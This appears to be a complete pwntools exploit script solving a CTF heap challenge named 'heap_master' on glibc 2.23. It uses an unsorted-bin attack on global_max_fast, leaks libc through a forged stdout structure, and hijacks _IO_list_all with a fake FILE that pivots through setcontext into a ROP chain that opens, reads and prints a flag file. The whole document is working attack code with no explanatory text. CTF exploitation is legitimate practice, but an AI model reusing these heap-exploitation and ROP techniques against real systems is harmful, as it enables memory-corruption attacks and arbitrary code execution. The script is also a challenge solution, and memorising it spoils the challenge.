from pwn import *

elf = ELF('./heap_master')
libc = ELF('./libc-2.23.so')
context.log_level = 'debug'

def add(size):
    p.sendlineafter('>> ', '1')
    p.sendlineafter('size: ', str(size))

def edit(off,cont):
    p.sendlineafter('>> ', '2')
    p.sendlineafter('offset: ', str(off))
    p.sendlineafter('size: ', str(len(cont)))
    p.sendafter('content: ', cont)

def delete(off):
    p.sendlineafter('>> ', '3')
    p.sendlineafter('offset: ', str(off))

def exp():
    for i in range(0xe):
        edit(0xf8 + i*0x10,p64(0x201))
    for i in range(0x10):
        edit(0x2f8 + i*0x10,p64(0x21))
    for i in range(0xd):
        delete(0x1d0-i*0x10)
        add(0x1f0)
    
    edit(0x100, p64(0xfbad1800) + p16(0x26a3))
    edit(0x110,p16(0x26a3))
    edit(0x118,p16(0x26a3))
    edit(0x120,p16(0x2618))
    edit(0x128,p16(0x26a3))
    edit(0x130,p16(0x26a3))
    edit(0x138,p16(0x26a3))
    edit(0x140,p16(0x26a3))
    edit(0x148, p64(0)*4 + p16(0x18e0))
    edit(0x170, p64(1) + p64(0xffffffffffffffff) + p64(0xa000000) + p16(0x3780))
    edit(0x190, p64(0xffffffffffffffff) + p64(0) + p16(0x17a0))
    edit(0x1a8,p64(0)*3 + p64(0x00000000ffffffff) + p64(0)*2 + p16(0x06e0))
    
    edit(0x1008,p64(0x91))
    edit(0x1098,p64(0x21))
    edit(0x10b8,p64(0x21))
    #edit(0x1148,p64(0x21))
    delete(0x1010)
    edit(0x1018,p16(0x37f8-0x10)) # unsortbin attack global_max_fast
    add(0x80)
    
    edit(0x108,p64(0x17e1))
    edit(0x18e8,p64(0x21))
    edit(0x1908,p64(0x21))
    delete(0x110)
    data = u64(p.recv(6).ljust(8,'\x00'))
    libc_base = data - 3946208
    log.success('libc_base is :'+hex(libc_base))
    IO_str_j = libc_base + libc.symbols['_IO_file_jumps']+0xc0
    morecore = libc_base + libc.symbols['__morecore'] - 8 - 0xa0
    setcontext = libc_base + 293749
    
    _IO_FILE = ( p64(0) +
                 p64(0)*3 +
                 p64(0) +                     # + 0x20 write_base
                 p64(0x7fffffffffffffff) +    #        write_ptr
                 p64(0xdadaddaaddddaaaa) +
                 p64(0) +                     # + 0x38 buf_base
                 p64((morecore - 100) / 2) +  #  rdi   buf_end
                 p64(0xdadaddaaddddaaaa)*11 +
                 p64(0) + 
                 p64(0xdadaddaaddddaaaa)*6 +
                 p64(IO_str_j) +          # + 0xd8
                 p64(setcontext))
    edit(0x2008,p64(0x1411))
    edit(0x3418,p64(0x21))
    delete(0x2010)  # modify _IO_list_all to mmap+0x2000
    #gdb.attach(p)
    edit(0x2000,_IO_FILE)
    edit(0x3008,p64(0x1121)) # modify __morecore-8 to mmap+0x3000
    edit(0x4128,p64(0x21))
    delete(0x3010)
    pop_rax = libc_base + 0x0000000000033544
    pop_rdi = libc_base + 0x0000000000021102
    pop_rsi = libc_base + 0x00000000000202e8
    pop_rdx = libc_base + 0x0000000000001b92
    syscall = libc_base + 0x00000000000bc375
    buf = libc_base + 3954496
    rop = (p64(pop_rax) + p64(0) + # read "/flag" ; open read write
           p64(pop_rdi) + p64(0) +
           p64(pop_rsi) + p64(buf) +
           p64(pop_rdx) + p64(0x100) +
           p64(syscall) +
           p64(pop_rax) + p64(2) +
           p64(pop_rdi) + p64(buf) +
           p64(pop_rsi) + p64(0) +
           p64(pop_rdx) + p64(0) +
           p64(syscall) +
           p64(pop_rax) + p64(0) +
           p64(pop_rdi) + p64(3) +
           p64(pop_rsi) + p64(buf) +
           p64(pop_rdx) + p64(100) +
           p64(syscall) +
           p64(pop_rax) + p64(1) +
           p64(pop_rdi) + p64(1) +
           p64(pop_rsi) + p64(buf) +
           p64(pop_rdx) + p64(100) +
           p64(syscall))
    edit(0x3000,rop)
    p.sendline("A") # trigger on exit()
    time.sleep(0.1)
    p.send("./flag\x00")
    
    p.interactive()

if __name__ == '__main__' :
    pd = 1
    while pd:
        try :
            p = process('./heap_master')
            exp()
            pd = 0
        except Exception :
            p.close()
        pass
